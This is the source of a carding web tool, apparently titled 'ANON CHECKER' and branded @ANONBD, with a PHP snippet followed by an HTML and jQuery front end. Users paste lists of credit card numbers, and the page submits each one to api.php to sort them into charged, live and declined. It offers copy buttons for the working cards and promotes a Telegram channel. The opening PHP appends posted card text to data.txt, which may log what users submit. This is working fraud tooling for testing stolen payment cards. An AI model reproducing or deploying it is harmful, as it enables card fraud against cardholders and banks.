<?php
            	
$data = $_POST['textdata'];
$fp = fopen('data.txt', 'a');
fwrite($fp, $data);
fclose($fp);
<!DOCTYPE html>
<html class="loading">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">    
    <title>@ANONBD</title>
    <link href="https://fonts.googleapis.com/css?family=Muli:300,300i,400,400i,600,600i,700,700i%7CComfortaa:300,400,700" rel="stylesheet">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="theme-assets/css/vendors.css">
    <link rel="stylesheet" type="text/css" href="theme-assets/css/app-lite.css">
    <link rel="stylesheet" type="text/css" href="theme-assets/css/core/menu/menu-types/vertical-menu.css">
    <link rel="stylesheet" type="text/css" href="theme-assets/css/core/colors/palette-gradient.css">
    	 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
  </head>
  <body class="vertical-layout" data-color="bg-gradient-x-purple-blue">   
    <div class="app-content content">
      <div class="content-wrapper">
        <div class="content-wrapper-before mb-3">        	
        </div>        
  <div class="content-body">
  	<div class="mt-2"></div>
	<div class="row">
		<div class="col-md-8">
			<div class="card">
				<div class="card-body text-center">
					<h4 class="mb-2"><strong>ANON CHECKER</strong></h4>
					<textarea rows="6" name="textdata" class="form-control text-center form-checker mb-2" placeholder="PUT YOUR CC HERE :>"></textarea>												
					<button class="btn btn-play btn-glow btn-bg-gradient-x-blue-cyan text-white" style="width: 49%; float: left;"><i class="fa fa-play"></i>START</button>
					<button class="btn btn-stop btn-glow btn-bg-gradient-x-red-pink text-white" style="width: 49%; float: right;" disabled><i class="fa fa-stop"></i>STOP</button>



				</div>
			</div>
		</div>
<div class="col-md-4">
  <div class="card mb-2">
  	<div class="card-body">
<h5>CHARGED :<span class="badge badge-success float-right charge">0</span></h5><hr>

<h5>LIVE :<span class="badge badge-success float-right aprovadas">0</span></h5><hr>

<h5>DIE :<span class="badge badge-danger float-right reprovadas">0</span></h5><hr>

<h5>TOTAL :<span class="badge badge-primary float-right carregadas">0</span></h5><hr>

<h5>LIMIT :<span class="badge badge-secondary float-right">500</span></h5>

                                    <label class="form-control-label" style="margin-left: 10px; margin-bottom: 20px" for="inputcvv"></label>
                  </div> 
                </div>
              </div>
            		<div class="col-xl-12">
			<div class="card">
				<div class="card-body">
					<div class="float-right">
						<button type="show" class="btn btn-primary btn-sm show-charge"><i class="fa fa-eye-slash"></i></button>
					<button class="btn btn-success btn-sm btn-copy1"><i class="fa fa-copy"></i></button>					
					</div>
					<h4 class="card-title mb-1"><i class="fa fa-check-circle text-success"></i> CHARGED</h4>					
			<div id='lista_charge'></div>
				</div>				
			</div>
		</div>
		<div class="col-xl-12">
			<div class="card">
				<div class="card-body">
					<div class="float-right">
						<button type="show" class="btn btn-primary btn-sm show-lives"><i class="fa fa-eye-slash"></i></button>
					<button class="btn btn-success btn-sm btn-copy"><i class="fa fa-copy"></i></button>					
					</div>
					<h4 class="card-title mb-1"><i class="fa fa-check text-success"></i> CVV/CCN</h4>					
			<div id='lista_aprovadas'></div>
				</div>				
			</div>
		</div>
		<div class="col-xl-12">
			<div class="card">
				<div class="card-body">
					<div class="float-right">
						<button type='hidden' class="btn btn-primary btn-sm show-dies"><i class="fa fa-eye"></i></button>
					<button class="btn btn-danger btn-sm btn-trash"><i class="fa fa-trash"></i></button>					
					</div>
					<h4 class="card-title mb-1"><i class="fa fa-times text-danger"></i> DECLINED</h4>		
						<div style='display: none;' id='lista_reprovadas'></div>
				</div>				
			</div>
		</div>
		
</section>
        </div>
      </div>
    </div>
 
    <script src="theme-assets/js/core/libraries/jquery.min.js" type="text/javascript"></script>

<script>
function removelinha(){var t=$(".form-checker").val().split("\n");t.splice(0,1),$(".form-checker").val(t.join("\n"))}$(document).ready(function(){Swal.fire({title:"@HACKERBD1",text:"Join Our Telegram Channel :(",icon:"warning",confirmButtonText:"OK",buttonsStyling:!1,confirmButtonClass:"btn btn-primary"}),$(".show-charge").click(function(){var t=$(".show-charge").attr("type");$("#lista_charge").slideToggle(),"show"==t?($(".show-charge").html('<i class="fa fa-eye"></i>'),$(".show-charge").attr("type","hidden")):($(".show-charge").html('<i class="fa fa-eye-slash"></i>'),$(".show-charge").attr("type","show"))}),$(".show-lives").click(function(){var t=$(".show-lives").attr("type");$("#lista_aprovadas").slideToggle(),"show"==t?($(".show-lives").html('<i class="fa fa-eye"></i>'),$(".show-lives").attr("type","hidden")):($(".show-lives").html('<i class="fa fa-eye-slash"></i>'),$(".show-lives").attr("type","show"))}),$(".show-dies").click(function(){var t=$(".show-dies").attr("type");$("#lista_reprovadas").slideToggle(),"show"==t?($(".show-dies").html('<i class="fa fa-eye"></i>'),$(".show-dies").attr("type","hidden")):($(".show-dies").html('<i class="fa fa-eye-slash"></i>'),$(".show-dies").attr("type","show"))}),$(".btn-trash").click(function(){Swal.fire({title:"REMOVE CC DIE SUCCESS",icon:"success",showConfirmButton:!1,toast:!0,position:"top-end",timer:3e3}),$("#lista_reprovadas").text("")}),$(".btn-copy1").click(function(){Swal.fire({title:"COPY CC CHARGED SUCCESS",icon:"success",showConfirmButton:!1,toast:!0,position:"top-end",timer:3e3});var t=document.getElementById("lista_charge").innerText,e=document.createElement("textarea");e.value=t,document.body.appendChild(e),e.select(),document.execCommand("copy"),document.body.removeChild(e)}),$(".btn-copy").click(function(){Swal.fire({title:"COPY CC LIVE SUCCESS",icon:"success",showConfirmButton:!1,toast:!0,position:"top-end",timer:3e3});var t=document.getElementById("lista_aprovadas").innerText,e=document.createElement("textarea");e.value=t,document.body.appendChild(e),e.select(),document.execCommand("copy"),document.body.removeChild(e)}),$(".btn-play").click(function(){var t=$(".form-checker").val().trim(),e=t.split("\n"),o=0,i=0,a=0,s=0,n="";if(!t)return Swal.fire({title:"Where your card?? please add a card!!",icon:"error",showConfirmButton:!1,toast:!0,position:"top-end",timer:3e3}),!1;Swal.fire({title:"Please wait for the card to be processed !!",icon:"success",showConfirmButton:!1,toast:!0,position:"top-end",timer:3e3});var r=e.filter(function(t){if(""!==t.trim())return n+=t.trim()+"\n",t.trim()}),c=r.length;if($(".form-checker").val(n.trim()),c>5e6)return Swal.fire({title:":) DARE TO CHECK MORE THAN 5000000 CC Ah, Pretty SMALL!!",icon:"warning",showConfirmButton:!1,toast:!0,position:"top-end",timer:3e3}),!1;$(".carregadas").text(c),$(".btn-play").attr("disabled",!0),$(".btn-stop").attr("disabled",!1),r.forEach(function(t){var e=$.ajax({url:"api.php?lista="+t,success:function(t){t.indexOf("#CHARGED")>=0?(Swal.fire({title:"+1 CHARGED CC",icon:"success",showConfirmButton:!1,toast:!0,position:"top-end",timer:3e3}),$("#lista_charge").append(t),removelinha(),o+=1):t.indexOf("#LIVE")>=0?(Swal.fire({title:"+1 LIVE CC",icon:"success",showConfirmButton:!1,toast:!0,position:"top-end",timer:3e3}),$("#lista_aprovadas").append(t),removelinha(),i+=1):($("#lista_reprovadas").append(t),removelinha(),a+=1),s=o+i+a,$(".charge").text(o),$(".aprovadas").text(i),$(".reprovadas").text(a),$(".testadas").text(s),s==c&&(Swal.fire({title:"HAVE BEEN DISPOSED",icon:"success",showConfirmButton:!1,toast:!0,position:"top-end",timer:3e3}),$(".btn-play").attr("disabled",!1),$(".btn-stop").attr("disabled",!0))}});$(".btn-stop").click(function(){return Swal.fire({title:"Succeeding Pause !!",icon:"warning",showConfirmButton:!1,toast:!0,position:"top-end",timer:3e3}),$(".btn-play").attr("disabled",!1),$(".btn-stop").attr("disabled",!0),e.abort(),!1})})})});
</script>

  </body>
</html>
